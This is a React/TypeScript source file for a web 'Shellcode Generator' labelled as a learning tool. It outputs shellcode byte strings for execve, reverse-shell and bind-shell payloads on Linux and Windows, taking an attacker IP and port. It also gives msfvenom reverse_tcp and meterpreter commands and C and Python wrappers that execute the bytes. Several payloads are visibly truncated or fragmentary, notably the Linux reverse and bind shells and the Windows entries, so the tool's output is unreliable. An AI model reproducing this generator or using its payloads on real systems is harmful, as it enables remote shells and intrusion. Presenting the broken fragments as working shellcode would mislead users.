import { useState } from 'react';
import styles from './Tool.module.css';

type Platform = 'linux-x86' | 'linux-x64' | 'windows-x86' | 'windows-x64';
type ShellcodeType = 'execve' | 'reverse-shell' | 'bind-shell' | 'meterpreter';

export default function ShellcodeGenerator() {
  const [platform, setPlatform] = useState<Platform>('linux-x64');
  const [shellcodeType, setShellcodeType] = useState<ShellcodeType>('execve');
  const [ip, setIp] = useState('');
  const [port, setPort] = useState('4444');
  const [command, setCommand] = useState('/bin/sh');
  const [shellcode, setShellcode] = useState('');
  const [format, setFormat] = useState<'hex' | 'c' | 'python'>('hex');

  const shellcodeTemplates: Record<Platform, Record<ShellcodeType, (params: any) => string>> = {
    'linux-x64': {
      'execve': () => 
        '\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05',
      'reverse-shell': ({ ip, port }) => {
        const ipHex = ip.split('.').map((o: string) => parseInt(o).toString(16).padStart(2, '0')).join('\\x');
        const portHex = parseInt(port).toString(16).padStart(4, '0');
        return `\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\\x02\\x${portHex.slice(0,2)}\\x${portHex.slice(2)}\\xc7\\x44\\x24\\x04\\x${ipHex}`;
      },
      'bind-shell': ({ port }) => {
        const portHex = parseInt(port).toString(16).padStart(4, '0');
        return `\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\\x48\\x31\\xf6\\x66\\xc7\\x44\\x24\\x02\\x${portHex.slice(0,2)}\\x${portHex.slice(2)}`;
      },
      'meterpreter': () => 
        '// Meterpreter shellcode requires msfvenom generation\n// Use: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f hex'
    },
    'linux-x86': {
      'execve': () =>
        '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80',
      'reverse-shell': ({ ip, port }) => {
        const ipHex = ip.split('.').map((o: string) => parseInt(o).toString(16).padStart(2, '0')).join('\\x');
        const portHex = parseInt(port).toString(16).padStart(4, '0');
        return `\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x${ipHex}\\x68\\x02\\x00\\x${portHex.slice(0,2)}\\x${portHex.slice(2)}`;
      },
      'bind-shell': ({ port }) => {
        const portHex = parseInt(port).toString(16).padStart(4, '0');
        return `\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\\x68\\x02\\x00\\x${portHex.slice(0,2)}\\x${portHex.slice(2)}`;
      },
      'meterpreter': () => 
        '// Use: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f hex'
    },
    'windows-x64': {
      'execve': () =>
        '\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff',
      'reverse-shell': () => 
        '// Use: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f hex',
      'bind-shell': () => 
        '// Use: msfvenom -p windows/x64/shell_bind_tcp LPORT=PORT -f hex',
      'meterpreter': () => 
        '// Use: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f hex'
    },
    'windows-x86': {
      'execve': () =>
        '\\x31\\xc9\\x64\\x8b\\x41\\x30\\x8b\\x40\\x0c\\x8b\\x70\\x14',
      'reverse-shell': () => 
        '// Use: msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hex',
      'bind-shell': () => 
        '// Use: msfvenom -p windows/shell_bind_tcp LPORT=PORT -f hex',
      'meterpreter': () => 
        '// Use: msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f hex'
    }
  };

  const generateShellcode = () => {
    const generator = shellcodeTemplates[platform][shellcodeType];
    const params = { ip, port, command };
    const raw = generator(params);
    
    setShellcode(formatShellcode(raw));
  };

  const formatShellcode = (raw: string): string => {
    if (raw.startsWith('//')) {
      return raw; // Comment/instruction
    }

    switch (format) {
      case 'hex':
        return raw;
      case 'c':
        return `unsigned char shellcode[] = "${raw}";\nint main() {\n    ((void(*)())shellcode)();\n    return 0;\n}`;
      case 'python':
        return `shellcode = b"${raw}"\nimport ctypes\nctypes.cast(ctypes.create_string_buffer(shellcode), ctypes.CFUNCTYPE(None))()`;
      default:
        return raw;
    }
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(shellcode);
  };

  return (
    <div className={styles.tool}>
      <div className={styles.toolHeader}>
        <div className={styles.toolTitle}>
          <span className={styles.toolIcon}>⚡</span>
          Shellcode Generator
        </div>
        <div className={styles.toolSubtitle}>
          Generate position-independent shellcode for exploit development
        </div>
      </div>

      <div className={styles.toolContent}>
        <div className={styles.inputGroup}>
          <label>Platform</label>
          <select value={platform} onChange={(e) => setPlatform(e.target.value as Platform)}>
            <option value="linux-x64">Linux x86-64</option>
            <option value="linux-x86">Linux x86 (32-bit)</option>
            <option value="windows-x64">Windows x64</option>
            <option value="windows-x86">Windows x86 (32-bit)</option>
          </select>
        </div>

        <div className={styles.inputGroup}>
          <label>Shellcode Type</label>
          <select value={shellcodeType} onChange={(e) => setShellcodeType(e.target.value as ShellcodeType)}>
            <option value="execve">Execute Command (execve)</option>
            <option value="reverse-shell">Reverse Shell</option>
            <option value="bind-shell">Bind Shell</option>
            <option value="meterpreter">Meterpreter Payload</option>
          </select>
        </div>

        {(shellcodeType === 'reverse-shell') && (
          <>
            <div className={styles.inputGroup}>
              <label>Attacker IP</label>
              <input
                type="text"
                value={ip}
                onChange={(e) => setIp(e.target.value)}
                placeholder="192.168.1.100"
              />
            </div>
            <div className={styles.inputGroup}>
              <label>Attacker Port</label>
              <input
                type="text"
                value={port}
                onChange={(e) => setPort(e.target.value)}
                placeholder="4444"
              />
            </div>
          </>
        )}

        {(shellcodeType === 'bind-shell') && (
          <div className={styles.inputGroup}>
            <label>Bind Port</label>
            <input
              type="text"
              value={port}
              onChange={(e) => setPort(e.target.value)}
              placeholder="4444"
            />
          </div>
        )}

        <div className={styles.inputGroup}>
          <label>Output Format</label>
          <select value={format} onChange={(e) => setFormat(e.target.value as any)}>
            <option value="hex">Raw Hex (\\x format)</option>
            <option value="c">C Code</option>
            <option value="python">Python Code</option>
          </select>
        </div>

        <button className={styles.primaryBtn} onClick={generateShellcode}>
          Generate Shellcode
        </button>

        {shellcode && (
          <div className={styles.outputSection}>
            <div className={styles.outputHeader}>
              <label>Generated Shellcode</label>
              <button className={styles.copyBtn} onClick={copyToClipboard}>
                Copy
              </button>
            </div>
            <div className={styles.output}>{shellcode}</div>
          </div>
        )}

        <div className={styles.infoBox}>
          <h3>Shellcode Characteristics</h3>
          <ul>
            <li><strong>Position Independent:</strong> Works at any memory address</li>
            <li><strong>Null-free:</strong> Avoids \\x00 bytes (breaks strcpy, etc.)</li>
            <li><strong>Compact:</strong> Minimized for tight buffer space</li>
            <li><strong>Syscall-based:</strong> Directly invokes OS syscalls</li>
          </ul>

          <h3>Production Tools</h3>
          <p>For real exploit development, use:</p>
          <ul>
            <li><strong>msfvenom:</strong> Metasploit payload generator (most comprehensive)</li>
            <li><strong>pwntools:</strong> Python exploit development library</li>
            <li><strong>shellnoob:</strong> Shellcode writing toolkit</li>
            <li><strong>ROPgadget:</strong> ROP chain automation</li>
          </ul>

          <p className={styles.warning}>
            ⚠️ This is a simplified shellcode generator for learning. Use msfvenom for production exploits. Always test in isolated environments.
          </p>
        </div>
      </div>
    </div>
  );
}
